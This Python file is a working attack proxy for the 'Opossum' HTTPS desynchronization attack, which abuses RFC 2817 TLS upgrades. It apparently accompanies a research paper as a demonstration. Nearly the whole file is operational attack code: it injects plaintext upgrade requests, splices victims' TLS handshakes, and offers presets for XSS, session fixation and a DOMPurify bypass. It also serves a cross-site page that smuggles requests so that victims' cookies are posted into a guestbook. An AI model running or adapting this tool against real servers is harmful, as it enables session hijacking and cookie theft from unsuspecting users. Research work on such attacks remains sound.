#!/usr/bin/env python3
"""
Opossum attack demo proxy -- HTTPS desynchronization via RFC 2817 (Upgrade: TLS/1.0).

The victim believes it speaks implicit TLS (HTTPS) to <domain>:<listen port>.
For every victim connection the proxy

  1. holds back the victim's ClientHello,
  2. opens a *plaintext* connection to the server's HTTP port and sends its own
     request with `Upgrade: TLS/1.0` (the "injected" request),
  3. waits for `101 Switching Protocols`,
  4. splices the victim's TLS handshake into that connection.

The handshake succeeds (same certificate, same ALPN), but the server answers the
injected request first -- the victim takes it as the answer to its own request,
and every later response on that connection is shifted by one.

The proxy never sees plaintext after the upgrade; it only relays TLS records.
Standard library only (Python 3.9+).

Examples:
  python3 opossum.py catdog --target 127.0.0.1 --host localhost
  python3 opossum.py rangexss --target 203.0.113.7 --host opossum.example.com --listen 0.0.0.0:443
  python3 opossum.py --path /dog.html -H 'X-Demo: 1' --target localhost
"""

import argparse
import asyncio
import itertools
import json
import os
import socket
import sys
import time

PRESETS = {
    "catdog": dict(
        path="/dog.html", headers={}, count=0,
        desc="resource confusion: the victim asks for /cat.html and gets /dog.html",
        hint="open https://{host}{port}/cat.html",
    ),
    "selfxss": dict(
        path="/selfxss.php", headers={"Cookie": "xss=1"}, count=0,
        desc="a self-XSS that needs the attacker's cookie becomes a reflected XSS",
        hint="open any page, e.g. https://{host}{port}/",
    ),
    "rangexss": dict(
        path="/safe.html", headers={"Range": "bytes=5-43"}, count=0,
        desc="a Range header cuts a <script> out of an HTML comment",
        hint="open any page, e.g. https://{host}{port}/",
    ),
    "session": dict(
        # count=2: browsers open two connections in parallel; attack both, then let the redirect through
        path="/login.php?username=admin&password=admin", headers={}, count=2,
        desc="session fixation: the victim receives the attacker's session cookie",
        hint="open https://{host}{port}/ -- the redirect lands in the attacker's account",
    ),
    "purify": dict(
        # every connection answers with purify.html: the <script src="purify.js"> gets HTML instead of
        # DOMPurify (on a new connection, or as the shifted response on a reused one), so the page's
        # fallback inserts the unsanitized input
        path="/purify.html", headers={}, count=0,
        desc="script replacement: purify.js is answered with HTML, DOMPurify never loads",
        hint="open https://{host}{port}/purify.html",
    ),
    "mitb": dict(
        # Figure 5 of the paper. The injected POST swallows the victim's cross-site form POST as its
        # body. That body ends with a second complete request -- POST /guestbook.php ... comment= --
        # whose own Content-Length then swallows the victim's NEXT request, the subresource that the
        # response triggers. That one is same-origin, so the browser attaches the cookies itself,
        # and the stock guestbook stores them as a comment. Needs the attacker page (--attacker-port).
        method="POST", path="/dump.php", headers={}, count=0,
        needs_body=True, mitb=True, pace=0.25,
        desc="request body desync: the victim's cookies are posted into the guestbook",
        hint="open the attacker page at http://127.0.0.1:{aport}/ and press the button",
    ),
}

# The padding is exactly one full TLS record. That matters: Content-Length then ends precisely on
# a record boundary, so when Apache has finished the first request nothing is left in its buffer.
# It blocks on the next read and flushes the response, which is what makes the browser render it and
# fetch the subresource. Without this Apache holds the response until the connection closes and the
# chain never starts -- the padding note in the paper's Figure 5 caption.
MITB_PAD = 16384
# enctype="text/plain" serialises one empty field as "<name>=\r\n", so 3 bytes follow the name.
MITB_TAIL = "=\r\n"
# Bytes of the embedded request's body that are not the stolen request. The field name ends in
# "comment" without the "=", so the serialiser's own separator completes it and the comment that
# gets stored is the stolen request itself rather than "=" followed by it.
MITB_PREFIX = len("comment") + len(MITB_TAIL)
DEFAULT_REQ2 = 650          # first guess for the victim's follow-up request, refined by measuring

REC_TYPES = {20: "ChangeCipherSpec", 21: "Alert", 22: "Handshake", 23: "ApplicationData"}

# ---------------------------------------------------------------- output ----

COLOR = sys.stdout.isatty() and not os.environ.get("NO_COLOR")


def paint(code, text):
    return f"\033[{code}m{text}\033[0m" if COLOR else text


def red(t): return paint("1;31", t)
def green(t): return paint("1;32", t)
def yellow(t): return paint("33", t)
def blue(t): return paint("34", t)
def magenta(t): return paint("35", t)
def dim(t): return paint("2", t)
def bold(t): return paint("1", t)


def log(cid, msg):
    stamp = time.strftime("%H:%M:%S")
    tag = f"#{cid:<3}" if cid else "    "
    print(f"{dim(stamp)} {bold(tag)} {msg}", flush=True)


def human(n):
    return f"{n} B" if n < 1024 else f"{n / 1024:.1f} kB"


# ------------------------------------------------------------------- TLS ----

async def read_record(reader):
    head = await reader.readexactly(5)
    body = await reader.readexactly(int.from_bytes(head[3:5], "big"))
    return head + body


def parse_client_hello(record):
    """Best effort: return (SNI, [ALPN protocols]) from a ClientHello record."""
    try:
        p = record[5:]
        if record[0] != 22 or p[0] != 1:
            return None, []
        i = 4 + 2 + 32                                  # header, version, random
        i += 1 + p[i]                                   # session id
        i += 2 + int.from_bytes(p[i:i + 2], "big")      # cipher suites
        i += 1 + p[i]                                   # compression methods
        end = i + 2 + int.from_bytes(p[i:i + 2], "big")
        i += 2
        sni, alpn = None, []
        while i + 4 <= end:
            ext = int.from_bytes(p[i:i + 2], "big")
            length = int.from_bytes(p[i + 2:i + 4], "big")
            data = p[i + 4:i + 4 + length]
            i += 4 + length
            if ext == 0 and len(data) > 5:              # server_name
                n = int.from_bytes(data[3:5], "big")
                sni = data[5:5 + n].decode(errors="replace")
            elif ext == 16:                             # ALPN
                j = 2
                while j < len(data):
                    n = data[j]
                    alpn.append(data[j + 1:j + 1 + n].decode(errors="replace"))
                    j += 1 + n
        return sni, alpn
    except (IndexError, ValueError):
        return None, []


# ----------------------------------------------------------------- proxy ----

class Proxy:
    def __init__(self, args):
        self.args = args
        self.preset = args.preset
        self.attacking = not args.passthrough
        self.remaining = None          # attacks left before falling back to passthrough
        self.ids = itertools.count(1)
        self.conns = set()
        self.measured = None           # victim request size, measured from TLS record sizes
        self.req1_total = None         # total size of the victim's cross-site POST (MitB)
        self.req1_emb = 0              # length of the smuggled request when that was measured
        self.req2 = None               # size of the victim's follow-up subresource request (MitB)
        self.reset_budget()

    # -- configuration -------------------------------------------------------

    def current(self):
        """Path and headers of the injected request (preset, overridable on the CLI)."""
        p = PRESETS.get(self.preset, {})
        path = self.args.path or p.get("path", "/")
        headers = dict(p.get("headers", {}))
        for h in self.args.header:
            k, _, v = h.partition(":")
            headers[k.strip()] = v.strip()
        return path, headers

    def reset_budget(self):
        count = self.args.count
        if count is None:
            count = PRESETS.get(self.preset, {}).get("count", 0)
        self.remaining = count or None   # None = unlimited

    @property
    def pace(self):
        """Seconds to wait after each victim record (MitB needs it, the other presets do not)."""
        if self.args.pace is not None:
            return self.args.pace
        return PRESETS.get(self.preset, {}).get("pace", 0)

    def mitb_embedded(self):
        """The second request, smuggled inside the victim's POST body; its body is the stolen one."""
        cl2 = (self.req2 or DEFAULT_REQ2) + MITB_PREFIX - 4   # -4: leave the final CRLFCRLF unread,
        return (                                              # so Apache never waits for more
            f"POST /guestbook.php HTTP/1.1\r\n"
            f"Host: {self.args.host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Connection: keep-alive\r\n"
            f"Content-Length: {cl2}\r\n"
            f"\r\n"
            f"comment"          # no "=": enctype="text/plain" appends it, then CRLF, then the loot
        )

    def body_length(self):
        """Bytes Apache should swallow as the body of the injected request."""
        if self.args.content_length:
            return self.args.content_length
        if PRESETS.get(self.preset, {}).get("mitb"):
            # everything the victim sends except the smuggled request and the text/plain tail
            return self.req1_total and self.req1_total - self.req1_emb - len(MITB_TAIL)
        return self.measured

    def injected_request(self):
        p = PRESETS.get(self.preset, {})
        path, headers = self.current()
        lines = [
            f"{p.get('method', 'GET')} {path} HTTP/1.1",
            f"Host: {self.args.host}",
            "User-Agent: opossum-demo",
            "Upgrade: TLS/1.0",
            "Connection: Upgrade",
        ]
        if p.get("needs_body"):
            lines += ["Connection: keep-alive", f"Content-Length: {self.body_length()}"]
        lines += [f"{k}: {v}" for k, v in headers.items()]
        return ("\r\n".join(lines) + "\r\n\r\n").encode()

    def attacker_page(self):
        """Cross-site page (served on a different origin) that makes the victim send Request 1."""
        embedded = self.mitb_embedded()
        pad_len = MITB_PAD
        port = "" if self.args.tls_port == 443 else f":{self.args.tls_port}"
        action = f"https://{self.args.host}{port}/dump.php"
        return f"""<!doctype html>
<html lang="en"><meta charset="utf-8"><title>Unrelated site</title>
<style>body{{font-family:system-ui,sans-serif;max-width:40rem;margin:3rem auto;padding:0 1rem;line-height:1.5}}
button{{font-size:1.1rem;padding:.7em 1.2em;border-radius:.4em;border:1px solid #888;cursor:pointer}}
code{{background:#eee;padding:.1em .35em;border-radius:.25em}}</style>
<h1>Just an unrelated page</h1>
<p>Served from <code id="origin"></code>, a different origin than the target. This page cannot read
the target's cookies, and the cross-site POST below carries none of them
(the session cookie is <code>HttpOnly; Secure; SameSite=Strict</code>).</p>
<button onclick="go()">Submit the form</button>
<script>
document.getElementById('origin').textContent = location.origin;
const PAD = "A".repeat({pad_len});
const EMBEDDED = {json.dumps(embedded)};
function go() {{
  const f = document.createElement('form');
  f.method = 'POST'; f.action = {json.dumps(action)}; f.enctype = 'text/plain';
  const i = document.createElement('input');
  i.name = PAD + EMBEDDED; i.value = '';
  f.appendChild(i); document.body.appendChild(f); f.submit();
}}
</script></html>"""

    async def serve_attacker(self, reader, writer):
        try:
            await asyncio.wait_for(reader.readuntil(b"\r\n\r\n"), 10)
            page = self.attacker_page().encode()
            writer.write(b"HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8\r\n"
                         b"Cache-Control: no-store\r\nConnection: close\r\nContent-Length: "
                         + str(len(page)).encode() + b"\r\n\r\n" + page)
            await writer.drain()
        except (OSError, asyncio.TimeoutError, asyncio.IncompleteReadError, asyncio.LimitOverrunError):
            pass
        finally:
            writer.close()

    def note_request(self, cid, size, conn):
        """One completed victim request seen on a passthrough connection.

        The padded cross-site POST is ~17 kB, so it is unmistakable. The request that matters next
        is the subresource the response triggers, and it only counts when it arrives on the same
        connection right after that POST -- that is exactly the position the attack steals from.
        """
        if size <= 100:
            return
        self.measured = max(self.measured or 0, size)
        if size > 5000:
            # remember how long the smuggled request was when this was measured, so a later change
            # to its Content-Length (one more digit) does not shift the result
            self.req1_total, self.req1_emb = size, len(self.mitb_embedded())
            conn["after_big"] = True
            log(cid, blue(f"calibrated: cross-site POST = {size} B -> Content-Length {self.body_length()}"))
        elif conn.get("after_big"):
            conn["after_big"] = False
            self.req2 = size
            log(cid, blue(f"calibrated: follow-up request = {size} B -> the one the attack steals"))
            if PRESETS.get(self.preset, {}).get("mitb") and self.attacking:
                # Calibration is complete. The browser would reuse this very connection for the next
                # POST, and a connection that already exists cannot be attacked -- the injection has
                # to happen before its handshake. So close them and let the next press start fresh.
                log(cid, red("calibration complete -- dropping connections, the next press is attacked"))
                asyncio.get_running_loop().call_later(0.5, self.drop_connections)

    def calibration_hint(self):
        """How the operator actually produces the measurement this preset needs."""
        if PRESETS.get(self.preset, {}).get("mitb"):
            return (f"open the attacker page http://127.0.0.1:{self.args.attacker_port}/ and press "
                    f"its button: the first press is measured, the next one attacks")
        return "let one request through (space toggles), then attack again"

    def status(self):
        if not self.attacking or self.remaining == 0:
            return f"mode: {green('PASSTHROUGH')} (victim -> {self.args.target}:{self.args.tls_port}, untouched)"
        path, headers = self.current()
        extra = "".join(f"  {k}: {v}" for k, v in headers.items())
        budget = "every connection" if self.remaining is None else f"next {self.remaining} connection(s)"
        p = PRESETS.get(self.preset, {})
        method = p.get("method", "GET")
        body = ""
        if p.get("needs_body"):
            n = self.body_length()
            body = f"  Content-Length: {n}" if n else yellow(f"  [not calibrated -- {self.calibration_hint()}]")
        return f"mode: {red('ATTACK')} [{self.preset or 'custom'}] inject {method} {path}{extra}{body}  ({budget})"

    # -- connections ---------------------------------------------------------

    async def handle(self, v_reader, v_writer):
        cid = next(self.ids)
        peer = v_writer.get_extra_info("peername")
        s_writer = None
        try:
            # 0. explicit proxy mode: the browser asks us to CONNECT to the site; afterwards
            #    we see exactly what an on-path attacker sees (end-to-end TLS)
            if self.args.http_proxy and not await self.accept_connect(cid, peer, v_reader, v_writer):
                return

            # 1. hold back the victim's ClientHello
            try:
                hello = await asyncio.wait_for(read_record(v_reader), 30)
            except (asyncio.TimeoutError, asyncio.IncompleteReadError, ConnectionError):
                return
            if hello[0] != 22:
                log(cid, yellow(f"{peer[0]} did not start with TLS (plain HTTP?) -- use https://"))
                return
            sni, alpn = parse_client_hello(hello)
            log(cid, f"victim {peer[0]}:{peer[1]} sends ClientHello  "
                     f"SNI={bold(sni or '-')}  ALPN={','.join(alpn) or '-'}")

            attack = self.attacking and self.remaining != 0
            if attack and PRESETS.get(self.preset, {}).get("needs_body") and not self.body_length():
                attack = False
                log(cid, yellow(f"not calibrated yet -- measuring this connection instead of "
                                f"attacking it. {self.calibration_hint()}"))
            if attack and self.remaining:
                self.remaining -= 1
                if self.remaining == 0:
                    log(0, dim("attack budget used up -- following connections pass through"))

            if attack:
                # 2./3. plaintext request with upgrade header, wait for 101
                s_reader, s_writer = await asyncio.open_connection(self.args.target, self.args.http_port)
                req = self.injected_request()
                s_writer.write(req)
                await s_writer.drain()
                log(cid, red(f"inject -> {self.args.target}:{self.args.http_port} (plaintext HTTP)"))
                for line in req.decode().strip().split("\r\n"):
                    log(cid, red(f"   | {line}"))
                resp = await asyncio.wait_for(s_reader.readuntil(b"\r\n\r\n"), 10)
                status = resp.split(b"\r\n", 1)[0].decode(errors="replace")
                if " 101 " not in status:
                    log(cid, yellow(f"server did not upgrade: {status!r} -- is 'SSLEngine optional' set?"))
                    return
                log(cid, red(f"   <- {status}  -> now splicing the victim's TLS handshake into it"))
            else:
                s_reader, s_writer = await asyncio.open_connection(self.args.target, self.args.tls_port)
                log(cid, green(f"passthrough -> {self.args.target}:{self.args.tls_port} (normal HTTPS)"))

            # 4. relay records unchanged in both directions
            s_writer.write(hello)
            await s_writer.drain()
            pair = (v_writer, s_writer)
            self.conns.add(pair)
            stats = {}
            conn = {"armed": False, "answers": 0, "segments": [], "accum": 0, "measure": not attack,
                    "pair": pair, "mitb": attack and PRESETS.get(self.preset, {}).get("mitb"),
                    "isolated": False}
            await asyncio.gather(
                self.relay(cid, v_reader, s_writer, "victim -> server", stats, conn, measure=not attack),
                self.relay(cid, s_reader, v_writer, "server -> victim", stats, conn),
            )
            self.conns.discard(pair)
            conn["segments"].append(conn["accum"])
            if self.args.verbose:
                log(cid, dim(f"   victim requests on this connection: {conn['segments']}"))
            if not attack:                       # only passthrough traffic is a clean measurement
                self.note_request(cid, conn["accum"], conn)
            summary = ", ".join(f"{d}: {n} rec / {human(b)}" for d, (n, b) in stats.items())
            log(cid, dim(f"closed ({summary})"))
        except (OSError, asyncio.TimeoutError, asyncio.IncompleteReadError) as e:
            log(cid, yellow(f"error: {e!r}"))
        finally:
            self.conns.discard((v_writer, s_writer))
            for w in (v_writer, s_writer):
                if w:
                    w.close()

    async def accept_connect(self, cid, peer, reader, writer):
        """Accept `CONNECT <host>:<tls port>` for the demo site only (not an open proxy)."""
        try:
            head = await asyncio.wait_for(reader.readuntil(b"\r\n\r\n"), 30)
        except (asyncio.TimeoutError, asyncio.IncompleteReadError, asyncio.LimitOverrunError, ConnectionError):
            return False
        method, _, rest = head.split(b"\r\n", 1)[0].decode(errors="replace").partition(" ")
        authority = rest.split(" ", 1)[0]
        host, _, port = authority.rpartition(":")
        if method != "CONNECT" or host.lower() != self.args.host.lower() or port != str(self.args.tls_port):
            writer.write(b"HTTP/1.1 403 Forbidden\r\nContent-Length: 0\r\nConnection: close\r\n\r\n")
            await writer.drain()
            if self.args.verbose:   # browsers make lots of background requests -- keep the demo log clean
                log(cid, dim(f"proxy: refused {method} {authority[:60]} (only CONNECT {self.args.host}:{self.args.tls_port})"))
            return False
        writer.write(b"HTTP/1.1 200 Connection Established\r\n\r\n")
        await writer.drain()
        log(cid, f"browser {peer[0]} asks the proxy for CONNECT {bold(authority)}")
        return True

    async def relay(self, cid, src, dst, direction, stats, conn, measure=False):
        """Forward TLS records untouched, and on the way note how big the victim's requests are.

        With TLS 1.3 everything after the handshake is a type-23 record whose plaintext is 17 bytes
        shorter than the ciphertext (content type + AEAD tag). The victim's first type-23 record is
        its encrypted Finished; after that, records are HTTP. Records are summed into one "segment"
        per request -- a segment ends when the server answers -- which is what classify() needs,
        because the MitB POST is ~17 kB spread over several records.
        """
        n = size = 0
        from_server = direction.startswith("server")
        # On an attacked connection, watch whether the server ever answers the victim's request: if
        # Content-Length is larger than that request, Apache is still waiting for body bytes that
        # never come. Only application data *after* the request counts -- the handshake records the
        # server sends before it do not mean it answered.
        watch_stall = not measure and not from_server
        finished_seen = False
        try:
            while True:
                rec = await read_record(src)
                plain = len(rec) - 5 - 17
                if rec[0] == 23:
                    if from_server:
                        # > 120 B, so TLS 1.3 session tickets (~57 B, which Apache sends even with
                        # SSLSessionTickets off) are not mistaken for an HTTP response
                        if conn["armed"] and plain > 120:
                            conn["answers"] += 1
                            # The response is what completes a request, so measure it here rather
                            # than when the victim's next request starts -- by then the operator has
                            # often already triggered the one we were supposed to attack.
                            if conn["accum"] > 0:
                                conn["segments"].append(conn["accum"])
                                if conn["measure"]:
                                    self.note_request(cid, conn["accum"], conn)
                                conn["accum"] = 0
                    elif not finished_seen:
                        finished_seen = True                      # the victim's encrypted Finished
                    else:
                        conn["accum"] += plain
                        if conn["mitb"] and not conn["isolated"] and conn["accum"] > 5000:
                            # This is the padded cross-site POST. The victim's next request has to
                            # arrive on this same connection, or the smuggled request never gets a
                            # body -- so close the spare connections the browser would rather use.
                            conn["isolated"] = True
                            others = self.keep_only(conn["pair"])
                            log(cid, red(f"this connection carries the cross-site POST "
                                         f"-> closed {others} spare connection(s) to force reuse"))
                        if plain > 120:
                            # from here on, a server reply means "it answered this request"
                            conn["armed"] = True
                            if watch_stall:
                                watch_stall = False
                                asyncio.get_running_loop().call_later(
                                    10, self.warn_stalled, cid, conn, plain)
                dst.write(rec)
                await dst.drain()
                # Pacing: hand Apache one record at a time so it can answer the victim's first
                # request before the next one arrives. Without this the paper's exploit does not
                # complete in the browser and the connection is not reused.
                if self.pace and not from_server and not measure and rec[0] == 23:
                    await asyncio.sleep(self.pace)
                n, size = n + 1, size + len(rec)
                stats[direction] = (n, size)        # live, so warn_stalled() can see progress
                if self.args.verbose:
                    kind = REC_TYPES.get(rec[0], f"type {rec[0]}")
                    log(cid, dim(f"   {direction}  {kind:<16} {human(len(rec) - 5):>8}  (encrypted)"))
        except (asyncio.IncompleteReadError, ConnectionError, OSError):
            pass
        finally:
            stats[direction] = (n, size)
            dst.close()

    def warn_stalled(self, cid, conn, request_size):
        if conn["answers"] == 0:
            if PRESETS.get(self.preset, {}).get("mitb"):
                log(cid, yellow(f"no response: Apache is still waiting for body bytes, so "
                                f"Content-Length {self.body_length()} does not fit this victim "
                                f"request. Recalibrate -- {self.calibration_hint()}"))
            else:
                log(cid, yellow(f"no response: Content-Length {self.body_length()} is larger than the "
                                f"victim's request (~{request_size} B) -- Apache is still waiting for "
                                f"the body. Pass --content-length {request_size}, or calibrate again."))

    def keep_only(self, keep):
        """Close every victim connection except `keep`; returns how many were closed."""
        n = 0
        for pair in list(self.conns):
            if pair is not keep:
                for w in pair:
                    w.close()
                self.conns.discard(pair)
                n += 1
        return n

    def drop_connections(self):
        for v, s in list(self.conns):
            v.close()
            s.close()
        self.conns.clear()

    # -- keyboard (only when attached to a terminal) -------------------------

    def on_key(self, key):
        names = list(PRESETS)
        if key in (" ", "a"):
            self.attacking = not self.attacking
        elif key.isdigit() and 1 <= int(key) <= len(names):
            self.preset, self.args.path, self.attacking = names[int(key) - 1], None, True
            self.measured = None            # a different preset targets a different request
        elif key == "k":
            pass
        elif key == "q":
            raise KeyboardInterrupt
        else:
            print(self.keys_help(), flush=True)
            return
        self.reset_budget()
        self.drop_connections()   # force the browser onto a fresh connection
        log(0, self.status())

    def keys_help(self):
        presets = "  ".join(f"[{i}] {n}" for i, n in enumerate(PRESETS, 1))
        return dim(f"keys: [space] attack on/off  {presets}  [k] drop connections  [q] quit")


def parse_args():
    ap = argparse.ArgumentParser(
        description="Opossum attack demo proxy (RFC 2817 HTTP->TLS upgrade desync).",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="presets:\n" + "\n".join(f"  {k:<9} {v['desc']}" for k, v in PRESETS.items()),
    )
    ap.add_argument("preset", nargs="?", choices=PRESETS, default="catdog")
    ap.add_argument("--target", default="localhost",
                    help="server to connect to (IP or name; default: localhost)")
    ap.add_argument("--host", help="Host header / domain of the site (default: --target)")
    ap.add_argument("--listen", default="0.0.0.0:1234",
                    help="address the victim connects to (default: 0.0.0.0:1234; ':443' = all interfaces, IPv4+IPv6)")
    ap.add_argument("--http-port", type=int, default=80, help="server port with RFC 2817 upgrade (default: 80)")
    ap.add_argument("--tls-port", type=int, default=443, help="server HTTPS port, used in passthrough (default: 443)")
    ap.add_argument("--path", help="override the path of the injected request")
    ap.add_argument("-H", "--header", action="append", default=[], help="extra header for the injected request")
    ap.add_argument("--count", type=int,
                    help="attack only the first N connections, then pass through (0 = all; session preset: 2)")
    ap.add_argument("--passthrough", action="store_true", help="start in passthrough mode (no attack)")
    ap.add_argument("--content-length", type=int,
                    help="body bytes the server should swallow; default: measured automatically")
    ap.add_argument("--attacker-port", type=int, default=8001,
                    help="port for the cross-site attacker page used by the mitb preset (default: 8001)")
    ap.add_argument("--pace", type=float,
                    help="seconds between forwarded victim records (default: per preset)")
    ap.add_argument("--http-proxy", action="store_true",
                    help="act as an explicit HTTP proxy (browser --proxy-server / OS proxy setting) "
                         "instead of a TLS endpoint; only CONNECT to --host is allowed")
    ap.add_argument("-v", "--verbose", action="store_true", help="log every relayed TLS record")
    args = ap.parse_args()
    args.host = args.host or args.target
    return args


async def main():
    args = parse_args()
    proxy = Proxy(args)
    lhost, _, lport = args.listen.rpartition(":")
    # empty host (e.g. --listen :443) = all interfaces, IPv4 and IPv6
    server = await asyncio.start_server(proxy.handle, lhost or None, int(lport))

    try:
        target_ip = socket.gethostbyname(args.target)
    except OSError:
        target_ip = "?"
    victim_port = args.tls_port if args.http_proxy else int(lport)
    port_suffix = "" if victim_port == 443 else f":{victim_port}"
    print(bold("Opossum demo proxy"))
    if args.http_proxy:
        print(f"  browser proxy        http://{args.listen}  (only CONNECT {args.host}:{args.tls_port} is allowed)")
        print(f"  victim opens         https://{args.host}{port_suffix}  -- the real URL, the real certificate")
    else:
        print(f"  victim connects to   https://{args.host}{port_suffix}  (listening on {args.listen})")
    print(f"  server               {args.target} ({target_ip})  upgrade port {args.http_port}, https port {args.tls_port}")
    if args.preset:
        print(f"  preset               {args.preset}: {PRESETS[args.preset]['desc']}")
        print(f"  try                  {PRESETS[args.preset]['hint'].format(host=args.host, port=port_suffix, aport=args.attacker_port)}")
    if (not args.http_proxy and target_ip.startswith("127.") and int(lport) == args.tls_port
            and lhost in ("", "0.0.0.0", "127.0.0.1", "localhost")):
        print(yellow("  warning: target resolves to this machine on the port we listen on -- "
                     "if you mapped the domain to 127.0.0.1 in /etc/hosts, pass the server's IP via --target"))
    if PRESETS.get(args.preset, {}).get("mitb"):
        await asyncio.start_server(proxy.serve_attacker, "127.0.0.1", args.attacker_port)
        print(f"  attacker page        http://127.0.0.1:{args.attacker_port}/  "
              f"(separate origin -- this is the Man-in-the-Browser part)")
    log(0, proxy.status())

    loop = asyncio.get_running_loop()
    restore = None
    if sys.stdin.isatty():
        import termios
        import tty
        fd = sys.stdin.fileno()
        saved = termios.tcgetattr(fd)
        tty.setcbreak(fd)
        restore = lambda: termios.tcsetattr(fd, termios.TCSADRAIN, saved)  # noqa: E731
        stop = loop.create_future()

        def on_stdin():
            try:
                for key in os.read(fd, 64).decode(errors="ignore"):
                    proxy.on_key(key)
            except KeyboardInterrupt:
                if not stop.done():
                    stop.set_result(None)

        loop.add_reader(fd, on_stdin)
        print(proxy.keys_help(), flush=True)
    else:
        stop = loop.create_future()

    try:
        async with server:
            await stop
    finally:
        if restore:
            restore()


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print()
